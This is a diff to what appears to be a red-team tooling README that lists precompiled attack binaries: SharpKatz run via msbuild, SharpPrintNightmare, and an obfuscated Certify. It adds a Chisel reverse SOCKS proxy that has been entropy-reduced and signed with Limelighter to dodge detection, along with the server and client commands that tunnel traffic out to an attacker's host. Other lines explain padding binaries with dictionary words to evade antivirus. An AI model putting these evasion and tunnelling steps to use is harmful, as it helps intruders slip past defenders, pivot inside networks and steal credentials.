@@ -58,6 +58,10 @@ Most of the stuff here is far from fancy or the best solution possible, sorry :(
 * SharpKatz.xml: SharpKatz.xml to be executed with msbuild.exe.
 * SharpPrintNightmare.exe: Precompiled SharpPrintNightmare.
 * c.exe: Certify.exe + InvisibilityCloak obfuscation.
+* c_signed.zip: Contains c\_signed.exe which is another version of Chisel.exe SOCKS5 proxy with reduced entropy and signed with Limelighter.
+  	* Server: `./chisel server -p 8000 --reverse`
+  	* Client: `c_signed.exe client <SERVER_IP>:8000 R:socks`
+  	* Run commands with proxychains and adjust config on server for Port 1080 on SOCKS5
 * dictionary.txt: Just a english dictionary to be appended on binaries to reduce entropy.
 	* `cat dictionary.txt >> t.exe`
 	* Check compressibility: `gzip -v -c t.exe > /dev/null`
